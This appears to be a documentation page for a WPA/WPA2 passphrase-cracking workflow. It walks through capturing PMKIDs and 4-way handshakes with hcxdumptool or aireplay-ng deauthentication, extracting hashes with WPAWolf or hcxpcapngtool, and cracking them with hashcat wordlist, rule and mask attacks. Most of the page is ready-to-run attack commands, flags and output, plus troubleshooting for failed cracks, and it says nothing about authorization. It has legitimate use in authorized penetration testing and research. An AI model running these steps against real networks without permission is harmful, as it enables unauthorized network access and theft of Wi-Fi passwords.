# WPA/WPA2 PSK Cracking

A start-to-finish workflow: capture traffic with hcxdumptool, extract hashes with WPAWolf, crack them with hashcat.

---

## What you need

| Component | Purpose | Install |
|-----------|---------|---------|
| Linux with a **monitor-mode WiFi adapter** | Capture raw 802.11 frames | Most Atheros / Ralink / Realtek chipsets work; check `iw list` for "monitor" support |
| **hcxdumptool** | Capture tool -- actively solicits PMKIDs and passively captures handshakes in one run | `sudo apt install hcxdumptool` or [build from source](https://github.com/ZerBea/hcxdumptool) |
| **[WPAWolf](https://github.com/StrongWind1/WPAWolf)** (primary) | Extract hashes from pcapng captures | Download a [prebuilt binary](https://github.com/StrongWind1/WPAWolf/releases) or `make release` from source |
| hcxpcapngtool (alternative) | Simpler extractor, fewer edge cases covered | `sudo apt install hcxtools` |
| **hashcat** with GPU drivers | Offline password cracking | `sudo apt install hashcat`; install CUDA or ROCm for GPU acceleration |
| A **wordlist** | Password candidates | `rockyou.txt` ships with Kali at `/usr/share/wordlists/rockyou.txt` (decompress with `gzip -d` first) |

---

## How WPA cracking works

Your WiFi password never travels over the air. Instead, both sides derive a 256-bit PMK from the passphrase using PBKDF2 (4096 rounds of HMAC-SHA1 with the SSID as salt), then prove they share it through a 4-way handshake. That handshake exposes two attack surfaces:

- **PMKID** -- the AP includes a fingerprint (`HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)`) in its first message. One frame from the AP is enough; no client needed.
- **EAPOL handshake** -- the client computes a MIC over handshake data using a key derived from the PMK. Capture at least one AP message and one client message, then verify password guesses offline by replaying the same math.

Both produce a hash that hashcat cracks with mode 22000.

!!! info "Protocol details"
    See [Key hierarchy](../protocol/key-hierarchy.md) for the full PMK/PTK derivation chain and [4-way handshake](../protocol/four-way-handshake.md) for byte-level frame anatomy.

---

## Step 1: Capture

### hcxdumptool (recommended)

hcxdumptool handles everything in one command: it sends association requests to solicit PMKIDs from nearby APs **and** passively captures any 4-way handshakes that happen on the channel. No manual channel hopping, no separate deauth tool.

```bash
sudo hcxdumptool -i wlan0 -o capture.pcapng --active_beacon --enable_status=15
```

| Flag | What it does |
|------|-------------|
| `-i wlan0` | Your monitor-mode interface |
| `-o capture.pcapng` | Output capture file |
| `--active_beacon` | Send beacons and association requests to solicit PMKIDs |
| `--enable_status=15` | Show all status messages (AP count, handshake count, PMKID count) |

Let it run for **2-5 minutes**. PMKIDs arrive fast (often within seconds); handshakes require a client to connect or reconnect during the capture window.

Press ++ctrl+c++ to stop. The output file contains everything -- both PMKIDs and handshakes in a single pcapng.

### Alternative: airodump-ng + aireplay-ng (classic approach)

The aircrack-ng workflow requires three separate steps and two terminal windows:

```bash
# Terminal 1: enable monitor mode and scan
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                                           # find your target

# Terminal 1: lock to target channel and capture
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Terminal 2: force a client reconnection (deauth)
sudo aireplay-ng -0 1 -a <BSSID> wlan0mon
# Watch Terminal 1 for "WPA handshake: <BSSID>"
```

This only captures handshakes (no PMKID solicitation) and requires a connected client to deauthenticate. Use hcxdumptool instead unless you have a specific reason not to.

---

## Step 2: Extract hashes

### WPAWolf (recommended)

WPAWolf reads your capture files and produces hashcat-ready hash files. It uses a collect-then-pair architecture: it reads every EAPOL message and PMKID across all input files first, then pairs them, so it never misses a valid combination.

**Basic -- single capture:**

```bash
wpawolf --22000-out hashes.22000 --37100-out hashes.37100 capture.pcapng
```

**Recommended -- directory of captures with smart dedup:**

```bash
wpawolf --22000-out hashes.22000 --smart captures/
```

`--smart` is the recommended reduction mode: it emits roughly one hash line per unique MIC instead of the full cross-product, without dropping any crackable hash.

**With auxiliary outputs (wordlist from SSIDs, WPS data, EAP identities):**

```bash
wpawolf --22000-out hashes.22000 --37100-out hashes.37100 \
        -E essids.txt -W wordlist.txt captures/
```

The stats banner tells you exactly what was extracted:

```
=== Phase 4: Emit ===================================================
output filters active.......................................: none (WIDE mode)
EAPOL pairs generated (total, pre-dedup)....................: 105
EAPOL pairs written (post-dedup)............................: 105
  N1E2 challenge (ANonce from M1, EAPOL from M2)............: 22
  N3E2 authorized (ANonce from M3, EAPOL from M2)...........: 18
--22000-out (legacy mode 22000).............................: hashes.22000
  lines written.............................................: 108
=== Phase 5: Report =================================================
hashes emitted (total)......................................: 147
wallclock total (s).........................................: 0.4
```

#### Why WPAWolf over hcxpcapngtool

| Behaviour | hcxpcapngtool | WPAWolf |
|-----------|---------------|---------|
| EAPOL frame size ceiling | 512 bytes at parse -- silently drops oversized FT frames | No size gate |
| Per-(AP, STA) message buffer | 64-entry circular buffer -- old entries evicted | Unbounded HashMap, no eviction |
| Cross-file pairing | State reset between files | M1 in file A pairs with M2 in file B |
| Pairing strategy | Stream-pairs as frames arrive (can miss late arrivals) | Collect everything, then pair |
| WDS / 4-address relay frames | Skipped unless `--all` | Always processed |

The practical difference: on large or multi-file captures, WPAWolf consistently extracts more valid hashes. On small single-file captures, both tools produce identical results.

### Alternative: hcxpcapngtool

```bash
hcxpcapngtool -o hashes.22000 -f hashes.37100 capture.pcapng
```

Simpler and widely available, but misses FT-PSK frames that exceed its 512-byte EAPOL size gate and can lose pairs when the 64-entry buffer wraps on busy captures.

### Verify extraction

```bash
wc -l hashes.22000                # total hash count
grep -c "^WPA\*01" hashes.22000   # PMKID hashes
grep -c "^WPA\*02" hashes.22000   # EAPOL handshake hashes
```

---

## Step 3: Crack with hashcat

### Wordlist attack

The simplest approach -- try every password in a list:

```bash
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
```

### Wordlist with rules

Rules apply mutations (capitalize, append digits, leet-speak) to each wordlist entry, multiplying coverage without a larger wordlist:

```bash
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Brute-force (mask attack)

For numeric passwords like default ISP passphrases (8 digits):

```bash
hashcat -m 22000 hashes.22000 -a 3 ?d?d?d?d?d?d?d?d
```

Common mask placeholders: `?d` = digit, `?l` = lowercase, `?u` = uppercase, `?s` = special, `?a` = all printable.

### Check results

```bash
hashcat -m 22000 hashes.22000 --show
```

Output format: `hash:password` -- the cracked passphrase appears after the colon.

### FT-PSK hashes (mode 37100)

If WPAWolf extracted FT-PSK hashes into a separate file:

```bash
hashcat -m 37100 hashes.37100 /usr/share/wordlists/rockyou.txt
```

!!! warning "Mode 37100 status"
    hashcat mode 37100 requires [PR #4645](https://github.com/hashcat/hashcat/pull/4645) which is not yet merged into mainline. Check the [gap table](../reference/gap-table.md) for current status.

### Speed context

WPA cracking is slow by design. PBKDF2 forces 4096 rounds of HMAC-SHA1 per password guess, so even a high-end GPU only manages roughly 500K--2M PMK/s. A good wordlist and smart rules matter far more than raw GPU speed. The 8-digit brute-force mask above covers 100 million candidates -- about 50 seconds on a modern GPU.

---

## Troubleshooting

### "No hashes found" after extraction

The capture did not contain a usable PMKID or handshake.

- **For PMKID:** Not all APs include a PMKID in their response. Run hcxdumptool longer, or try a different target. Some APs only respond to PMKIDs on the first association attempt after a reboot.
- **For handshake:** A client must connect (or reconnect) during the capture window. With hcxdumptool's `--active_beacon`, the tool sends disassociation frames to trigger reconnections. With the aircrack-ng workflow, send a deauth manually: `sudo aireplay-ng -0 1 -a <BSSID> wlan0mon`.
- **Wrong interface:** Confirm your adapter is in monitor mode with `iw dev wlan0 info` -- the "type" field should say "monitor".

### hashcat says "Exhausted"

Every candidate was tested and none matched. The password is not in your wordlist.

- Try a larger wordlist ([SecLists](https://github.com/danielmiessler/SecLists), [weakpass](https://weakpass.com)).
- Add rules: `-r /usr/share/hashcat/rules/best64.rule` or `-r /usr/share/hashcat/rules/d3ad0ne.rule`.
- Try common ISP patterns: 8-digit numeric (`?d?d?d?d?d?d?d?d`), 10-digit numeric, or mixed alpha-numeric masks.
- Use WPAWolf's `-W` flag to generate a targeted wordlist from SSIDs, probe names, and WPS device info found in the capture itself.

### AKM 6 PMKID silently fails

If the target AP negotiates AKM 6 (PSK-SHA256), the PMKID uses HMAC-SHA256 but hashcat mode 22000's PMKID kernel (aux4) hardcodes HMAC-SHA1. The correct passphrase reports "Exhausted" with no warning. This is a known bug in hashcat, not a problem with your capture or extraction.

**Workaround:** attack via the EAPOL handshake instead -- hashcat's EAPOL kernel (aux3, AES-128-CMAC) handles AKM 6 correctly. If your capture contains both a PMKID and a handshake for the same AP, the EAPOL hash will crack even though the PMKID will not. See the [gap table](../reference/gap-table.md) for the full compatibility matrix.

### WPAWolf shows pairs but hashcat shows 0 hashes

Check that the hash file is not empty and that you are using the correct mode:

- `WPA*01*` and `WPA*02*` lines go to mode 22000 (`-m 22000`)
- `WPA*03*` and `WPA*04*` lines go to mode 37100 (`-m 37100`)

If you used WPAWolf's combined output (`-o all.out`), that file contains extended-format hashes that no current hashcat mode reads. Use `--22000-out` and `--37100-out` for hashcat-compatible output.
